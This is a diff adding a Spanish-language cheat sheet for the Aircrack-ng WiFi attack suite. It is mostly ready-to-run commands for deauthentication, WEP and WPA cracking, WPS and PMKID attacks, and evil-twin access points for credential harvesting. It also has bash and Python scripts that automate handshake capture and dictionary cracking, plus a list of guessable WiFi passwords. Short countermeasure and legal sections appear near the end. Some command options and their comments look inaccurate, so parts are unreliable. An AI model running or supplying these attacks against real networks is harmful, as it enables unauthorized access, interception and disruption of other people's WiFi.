@@ -1,0 +1,409 @@
+# AIRCRACK-NG - WI-FI SECURITY AUDITING SUITE
+
+## Descripción
+Aircrack-ng es una suite completa de herramientas para auditoría de seguridad
+en redes WiFi. Incluye herramientas para captura de paquetes, ataques,
+testing y cracking de claves WEP y WPA/WPA2.
+
+## Ejemplo Real
+Durante una auditoría de seguridad WiFi corporativa, necesitas verificar
+la fortaleza de la red "CorporateWiFi". Primero pones la tarjeta en modo monitor:
+airmon-ng start wlan0, luego capturas handshakes: airodump-ng wlan0mon
+
+## Componentes Principales
+
+airmon-ng          # Habilitar/deshabilitar modo monitor
+airodump-ng        # Capturar paquetes 802.11
+aireplay-ng        # Generar tráfico (ataques de inyección)
+aircrack-ng        # Crackear claves WEP/WPA
+airdecap-ng        # Descifrar capturas WEP/WPA
+packetforge-ng     # Crear paquetes cifrados
+ivstools           # Manipular archivos .ivs
+airbase-ng         # Crear AP falso
+airolib-ng         # Gestionar base de datos de passwords
+airserv-ng         # Servidor remoto para herramientas
+
+## Configuración Inicial
+
+# Verificar interfaces wireless
+iwconfig
+
+# Matar procesos que interfieren
+airmon-ng check kill
+
+# Poner interfaz en modo monitor
+airmon-ng start wlan0
+
+# Verificar modo monitor
+iwconfig
+
+# Restaurar modo normal
+airmon-ng stop wlan0mon
+
+## Reconocimiento WiFi
+
+# Escaneo básico de redes
+airodump-ng wlan0mon
+
+# Guardar captura en archivo
+airodump-ng wlan0mon -w captura
+
+# Escaneo de canal específico
+airodump-ng wlan0mon -c 6
+
+# Escaneo solo WPA/WPA2
+airodump-ng wlan0mon --encrypt wpa
+
+# Mostrar solo APs
+airodump-ng wlan0mon --ap
+
+# Filtrar por BSSID específico
+airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF
+
+# Información extendida
+airodump-ng wlan0mon --manufacturer
+
+## Captura de Handshakes WPA/WPA2
+
+# Capturar handshake de red específica
+airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake
+
+# Deautenticación para forzar reconexión
+aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Deauth dirigida a cliente específico
+aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
+
+# Verificar handshake capturado
+aircrack-ng handshake-01.cap
+
+## Ataques WEP
+
+# Ataque FMS/Korek (pasivo)
+aircrack-ng captura-01.cap
+
+# Ataque PTW (más rápido)
+aircrack-ng -z captura-01.cap
+
+# Ataque de fragmentación
+aireplay-ng -5 -b AA:BB:CC:DD:EE:FF wlan0mon
+
+# Ataque ChopChop
+aireplay-ng -4 -b AA:BB:CC:DD:EE:FF wlan0mon
+
+# Inyección de ARP
+aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon
+
+# Autenticación falsa
+aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Ataque de asociación interactiva
+aireplay-ng -1 6000 -o 1 -q 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+## Ataques WPA/WPA2
+
+# Ataque de diccionario básico
+aircrack-ng -w diccionario.txt handshake-01.cap
+
+# Con archivo de diccionario específico
+aircrack-ng -w /usr/share/wordlists/rockyou.txt captura.cap
+
+# Especificar ESSID objetivo
+aircrack-ng -w diccionario.txt -e "NombreRed" captura.cap
+
+# Ataque con múltiples diccionarios
+aircrack-ng -w dic1.txt,dic2.txt,dic3.txt captura.cap
+
+# Mostrar progress cada X keys
+aircrack-ng -w diccionario.txt captura.cap -l progress.log
+
+## Creación de Access Points Falsos
+
+# AP abierto básico
+airbase-ng -e "WiFi_Gratis" wlan0mon
+
+# AP con WEP
+airbase-ng -e "RedSegura" -W 1 -z 2 wlan0mon
+
+# Evil Twin (clonar AP existente)
+airbase-ng -e "CorporateWiFi" -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon
+
+# AP con filtro MAC
+airbase-ng -e "RedPrivada" -d 11:22:33:44:55:66 wlan0mon
+
+# Capturar credenciales (WPA Enterprise)
+airbase-ng -e "CorporateWiFi" -Z 2 wlan0mon
+
+## Inyección de Paquetes
+
+# Test de inyección
+aireplay-ng -9 wlan0mon
+
+# Test contra AP específico
+aireplay-ng -9 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Inyección de paquetes personalizados
+packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 -l 11:22:33:44:55:66 -k 255.255.255.255 -y fragment.xor -w arp-packet
+
+# Reproducir paquete creado
+aireplay-ng -2 -r arp-packet wlan0mon
+
+## Técnicas Avanzadas
+
+# WPS PIN attack (con reaver)
+reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6
+
+# PMKID attack (hashcat mode 22000)
+hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
+
+# Convertir para hashcat
+hcxpcapngtool -o hash.22000 -E essidlist pmkid.pcapng
+
+# Crack con hashcat
+hashcat -m 22000 hash.22000 wordlist.txt
+
+## Gestión de Bases de Datos
+
+# Crear base de datos de passwords
+airolib-ng passwords.db --import passwd /usr/share/wordlists/rockyou.txt
+
+# Importar ESSIDs
+airolib-ng passwords.db --import essid essids.txt
+
+# Generar PMKs
+airolib-ng passwords.db --batch
+
+# Usar base de datos pre-computada
+aircrack-ng -r passwords.db captura.cap
+
+## Scripts de Automatización
+
+# Bash script para captura automatizada
+#!/bin/bash
+INTERFACE="wlan0mon"
+TARGET_BSSID="AA:BB:CC:DD:EE:FF"
+CHANNEL="6"
+OUTPUT="handshake"
+
+echo "Iniciando captura de handshake..."
+airodump-ng $INTERFACE -c $CHANNEL --bssid $TARGET_BSSID -w $OUTPUT &
+AIRODUMP_PID=$!
+
+sleep 10
+
+echo "Enviando deauth packets..."
+aireplay-ng -0 5 -a $TARGET_BSSID $INTERFACE
+
+sleep 5
+
+echo "Verificando handshake..."
+kill $AIRODUMP_PID
+aircrack-ng ${OUTPUT}-01.cap
+
+# Python script para ataques automatizados
+#!/usr/bin/env python3
+import subprocess
+import time
+import sys
+
+def run_command(cmd):
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        return result.returncode == 0, result.stdout, result.stderr
+    except Exception as e:
+        return False, "", str(e)
+
+def capture_handshake(interface, bssid, channel, output):
+    # Iniciar captura
+    capture_cmd = f"airodump-ng {interface} -c {channel} --bssid {bssid} -w {output}"
+    capture_proc = subprocess.Popen(capture_cmd, shell=True)
+    
+    time.sleep(10)
+    
+    # Enviar deauth
+    deauth_cmd = f"aireplay-ng -0 5 -a {bssid} {interface}"
+    run_command(deauth_cmd)
+    
+    time.sleep(5)
+    
+    # Terminar captura
+    capture_proc.terminate()
+    
+    # Verificar handshake
+    verify_cmd = f"aircrack-ng {output}-01.cap"
+    success, output_text, error = run_command(verify_cmd)
+    
+    return "WPA handshake" in output_text
+
+def crack_wpa(capfile, wordlist):
+    crack_cmd = f"aircrack-ng -w {wordlist} {capfile}"
+    success, output, error = run_command(crack_cmd)
+    
+    if "KEY FOUND" in output:
+        # Extraer la clave encontrada
+        for line in output.split('\n'):
+            if "KEY FOUND" in line:
+                return line.split('[')[1].split(']')[0]
+    
+    return None
+
+# Configuración
+interface = "wlan0mon"
+target_bssid = "AA:BB:CC:DD:EE:FF"
+channel = "6"
+output_file = "handshake"
+wordlist = "/usr/share/wordlists/rockyou.txt"
+
+print("Capturando handshake...")
+if capture_handshake(interface, target_bssid, channel, output_file):
+    print("Handshake capturado exitosamente!")
+    
+    print("Iniciando ataque de diccionario...")
+    key = crack_wpa(f"{output_file}-01.cap", wordlist)
+    
+    if key:
+        print(f"¡Clave encontrada!: {key}")
+    else:
+        print("Clave no encontrada en el diccionario.")
+else:
+    print("No se pudo capturar el handshake.")
+
+## Análisis Forense
+
+# Extraer información de captura
+aircrack-ng -H captura.cap
+
+# Mostrar detalles de la red
+airdecap-ng -e "NombreRed" -p contraseña captura.cap
+
+# Convertir formato
+aircrack-ng captura.cap -J hashcat
+
+# Análisis estadístico
+airodump-ng captura.cap --write-interval 1 --output-format csv
+
+## Integración con Otras Herramientas
+
+# Con Wireshark para análisis
+wireshark captura.cap
+
+# Con Hashcat para cracking WPA2
+hashcat -m 2500 handshake.hccapx wordlist.txt
+
+# Con John the Ripper
+john --wordlist=wordlist.txt --format=wpapsk handshake.hccap
+
+# Con Cowpatty
+cowpatty -r handshake.cap -f wordlist.txt -s "ESSID"
+
+## Casos de Uso Específicos
+
+# Auditoría corporativa
+1. Identificar todas las redes corporativas
+2. Verificar fortaleza de contraseñas
+3. Detectar redes rogue/no autorizadas
+4. Documentar configuraciones inseguras
+
+# Red Team Exercise
+1. Crear AP falso para credential harvesting
+2. Capturar handshakes de empleados
+3. Crack passwords offline
+4. Documentar acceso exitoso
+
+# Investigación forense
+1. Analizar capturas de tráfico WiFi
+2. Identificar dispositivos conectados
+3. Reconstruir comunicaciones
+4. Correlacionar con otros logs
+
+## Contramedidas y Detección
+
+# Detectar modo monitor
+iwconfig | grep Monitor
+
+# Monitorear deauth attacks
+tail -f /var/log/hostapd.log | grep "deauth"
+
+# Detectar APs falsos
+airodump-ng wlan0mon | grep -E "(WPS|Open)"
+
+# Análisis de señal para detectar proximidad
+airodump-ng wlan0mon --write-interval 1 | grep -E "(\-30|\-40|\-50)"
+
+## Mejores Prácticas de Seguridad WiFi
+
+# Para administradores
+1. Usar WPA3 cuando sea posible
+2. Contraseñas largas y complejas (>15 caracteres)
+3. Deshabilitar WPS
+4. Ocultar ESSID solo como medida adicional
+5. Filtrado MAC como capa extra
+6. Monitoreo continuo de redes
+7. Segregación de red por VLANs
+8. Certificados para WPA Enterprise
+
+# Para auditores
+1. Obtener autorización por escrito
+2. Documentar toda la metodología
+3. No interrumpir operaciones críticas
+4. Coordinar con equipos de IT
+5. Proteger datos capturados
+6. Borrar archivos temporales después de auditoría
+
+## Diccionarios Especializados
+
+# Español/Castellano
+/usr/share/wordlists/spanish-passwords.txt
+/usr/share/wordlists/nombres-espanol.txt
+
+# Combinaciones comunes WiFi
+NombreEmpresa2024
+NombreEmpresa123!
+Router123
+Movistar123
+Vodafone2024
+empresa_wifi_2024
+
+# Patrones temporales
+Invierno2024
+Verano2024
+Enero2024
+Diciembre2023
+
+## Troubleshooting Común
+
+# Error: "Fixed channel X: -1"
+iwconfig wlan0mon channel 6
+
+# No injection working
+aireplay-ng -9 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Interfaz no en modo monitor
+airmon-ng check kill
+airmon-ng start wlan0
+
+# Handshake no válido
+# Verificar que hay tráfico del cliente objetivo
+# Asegurar que deauth llegue al cliente
+# Capturar por más tiempo
+
+## Optimización de Performance
+
+# Para capturas largas
+airodump-ng wlan0mon --write-interval 10 -w captura
+
+# Múltiples canales
+airodump-ng wlan0mon --channel 1,6,11
+
+# Solo mostrar APs activos
+airodump-ng wlan0mon --active
+
+# Filtrar por fabricante
+airodump-ng wlan0mon --manufacturer | grep -i cisco
+
+## Consideraciones Legales
+- Solo usar en redes propias o con autorización explícita
+- Cumplir con regulaciones locales de espectro radioeléctrico
+- No interceptar comunicaciones de terceros sin autorización
+- Documentar cadena de custodia para evidencia legal
+- Respetar privacidad de usuarios legítimos
